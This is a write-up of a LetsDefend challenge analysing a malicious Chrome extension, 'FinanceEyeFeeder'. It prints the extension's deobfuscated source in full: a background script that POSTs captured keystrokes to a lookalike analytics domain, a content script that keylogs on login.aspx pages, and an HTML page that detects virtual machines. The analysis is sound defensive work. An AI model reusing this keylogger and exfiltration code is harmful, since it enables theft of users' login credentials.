# Suspicious Browser Extension - Let's Defend https://app.letsdefend.io/challenge/suspicious-browser-extension

For this challenge, we're given a `.crx` file which is a Chrome extension file. We can confirm this by running `file` on it:

![](https://i.imgur.com/gqYjnxu.png)

Browser extensions are typically `.zip` files that contain the elements that make up the extension such as any Javascript, HTML, or other assets like the images associated with the extension. Knowing this, we can simply `.unzip` the extension to perform further analysis:

`unzip FinanceEYEfeeder.crx`

![](https://i.imgur.com/4o0rjIu.png)

The main file in browser extensions that typically has metadata is the `manifest.json` file which was extracted. The `manifest.json` file allows for an extension to specify metadata such as its name, description, version, etc.

The metadata of our suspicious browser extension includes:

![](https://i.imgur.com/exoJKa7.png)

The extension's name is FinanceEyeFeeder and it's described as being "a *trusted* utility for reading financial news." 

As you can see from the screenshot of when we unzipped the `.crx` file, there are 2 Javascript files associated with it. You can also see how these files are referenced in the manifest file:

* `background.js` which is set to run in the background
* `content.js` which is set to run in the context of a webpage, meaning it can read webpage elements, modify those elements, and pass info to their parent extension
  * Reference: https://developer.chrome.com/docs/extensions/mv3/content_scripts/

Now that we know the name of the extension, we can visit `crxcavator.io` to search for the extension by name to see if it's known.

* *NOTE https://crxcavator.io is an extension scanner that will tell you how risky a browser extension is using factors such as: the permissions the extension requires, the vulnerable 3rd party Javascript libraries it uses, etc*

![](https://i.imgur.com/pqWQiQ8.png)

Unfortunately `crxcavator` hasn't scanned our extension yet. 

We'll now move on to using another tool known as [ExtAnalysis](https://github.com/Tuhinshubhra/ExtAnalysis) to further analyze the extension

*NOTE: You may have to downgrade your pip version before installing the requirements necessary for running ExtAnalysis. I had to downgrade to version 21.3.1 by running pip install pip==21.3.1*

Once ExtAnalysis is installed, run it using `python3 extanalysis.py` and you'll be taken to a webpage where you can upload the `.crx` file.

Once it's uploaded, you'll be presented with an analysis report which can be accesed by going to `analysis reports > reload reports > view`

![](https://i.imgur.com/uQIoaYE.png)

The **author** of the extension is unknown and there are 2 **unique domains & extracted URLs**. 

We can begin analyzing the 2 javascript files within the extension by going to files > view source for `background.js`:

![](https://i.imgur.com/wuV0xVO.png)

We can then use [a javascript deobfuscator](https://deobfuscate.io/) to make the code easier to read:

```javascript
function c() {
  var o = ["apply", "nction() ", "console", "info", "key", "responseTe", "txt", "setRequest", "ded", "onMessage"];
  c = function () {
    return o;
  };
  return c();
}
function d(a, b) {
  var e = c();
  return d = function (f, g) {
    f = f - 0;
    var h = e[f];
    return h;
  }, d(a, b);
}
var b = function () {
  var e = true;
  return function (f, g) {
    var h = e ? function () {
      if (g) {
        var i = g[d(0)](f, arguments);
        return g = null, i;
      }
    } : function () {};
    return e = false, h;
  };
}(), a = b(this, function () {
  var f;
  try {
    var g = Function("return (fu" + d(1) + '{}.constructor("return this")( )' + ");");
    f = g();
  } catch (n) {
    f = window;
  }
  var h = f[d(2)] = f.console || {}, i = ["log", "warn", d(3), "error", "exception", "table", "trace"];
  for (var j = 0; j < i.length; j++) {
    var k = b.constructor.prototype.bind(b), l = i[j], m = h[l] || k;
    k.__proto__ = b.bind(b), k.toString = m.toString.bind(m), h[l] = k;
  }
});
a();
function handleMessage(e) {
  data = d(4) + e[d(4)] + "&page=" + e.page;
  var f = new XMLHttpRequest;
  f.onload = function () {
    console(this[d(5) + "xt"]);
  }, f.open("POST", "https://google-analytics-cm.com/analytics-3032344." + d(6), true), f[d(7) + "Header"]("Content-Type", "application/x-www-form-urlenco" + d(8)), f.send(data);
}
chrome.runtime[d(9)].addListener(handleMessage);
```

The `handleMessage` function is responsible for exfiltrating some data and POSTing it to the specified URL, but the URL is currently obfuscated. 

Deobfuscation is handled by the `c`, `d`, `b`, & `a` functions. We can deobfuscate the URL by simply pasting the functions into a browser console, then putting the URL deobfuscation process into a variable & calling that variable:

![](https://i.imgur.com/pAEDRE7.png)

The URL we get is `https://google-analytics-cm[.]com/analytics-3032344.txt`

Let's move on to investigate the other javascript file, `content.js`:

![](https://i.imgur.com/BWnMq6I.png)

Running through the deobfuscator:

```javascript
chrome.runtime.onConnect.addListener(function (_0x8616x1) {});
chrome.webRequest.onBeforeRequest.addListener(function (_0x8616x2) {
  if (_0x8616x2.url == str.match("^(.*[/])?login.aspx([?].*)?$")) {
    var _0x8616x3 = "";
    var _0x8616x4 = {};
    window.onkeydown = function (_0x8616x5) {
      if (_0x8616x5.key.length > 1) {
        _0x8616x3 = " (" + _0x8616x5.key + ") ";
      } else {
        _0x8616x3 = _0x8616x5.key;
      }
      ;
      _0x8616x4 = {key: _0x8616x3, page: window.location.href};
      chrome.runtime.sendMessage(_0x8616x4);
    };
  }
});
```

The job of this file is to activate a keylogger if the user visits any URL that ends in `login.aspx`, indicating a login page. 

We can now move on to analyzing the `ThankYou.html` file which appeared to be suspicious:

```html
                <!DOCTYPE html>
<html>
<body onload="FinanceSorter()">

<script>
chrome.processes.getProcessInfo(); 
function FinanceSorter() {
  var canvas = document.createElement('canvas');
  var gl = canvas.getContext('webgl');
  var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
  var vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
  var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);

  var width = screen.width;
  var height = screen.height;
  var color_depth = screen.colorDepth;

  setTimeout(function(){
    if (true) {
      if (/swiftshader/i.test(renderer.toLowerCase()) || /llvmpipe/i.test(renderer.toLowerCase()) || /virtualbox/i.test(renderer.toLowerCase()) || /vmware/i.test(renderer.toLowerCase()) || !renderer){
        console.log("检测到")
        chrome.processes.terminate(0);
      }
        else if (color_depth < 24 || width < 100 || width < 100 || color_depth){
          console.log("检测到")
          chrome.processes.terminate(0);
      }

    }
  }, 200);  
}
</script>

</body>
</html>
```

This HTML file has the responsibility of detecting if the extension is running in a virtual machine. If it is is, then it terminates the Google Chrome process and logs the word "Detected" in Chinese to the browser's console. It attempts to detect this by searching for certain renderers, specifically vmware, virtualbox, and llvmpipe. It also attempts to detect if its running in a VM by looking at the machine's color depth. 

If you have been infected with this extension previously, it's recommended that you change your passwords and ensure that you only install extensions that are reputable.

# 
